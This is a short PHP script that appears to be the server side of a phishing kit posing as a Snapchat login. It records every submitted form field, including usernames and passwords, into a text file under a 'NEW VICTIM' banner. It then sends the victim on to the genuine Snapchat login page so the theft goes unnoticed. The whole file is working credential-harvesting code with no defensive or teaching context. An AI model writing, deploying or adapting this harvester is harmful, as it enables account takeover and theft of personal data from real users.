<?php
// Capture Snapchat Data
$handle = fopen("usernames.txt", "a");
fwrite($handle, "---------- NEW VICTIM (SNAPCHAT) ----------\n");

foreach($_POST as $variable => $value) {
   fwrite($handle, $variable . ": " . $value . "\n");
}

fclose($handle);

// Redirect to official Snapchat Login
header("Location: https://accounts.snapchat.com/");
exit;
?>
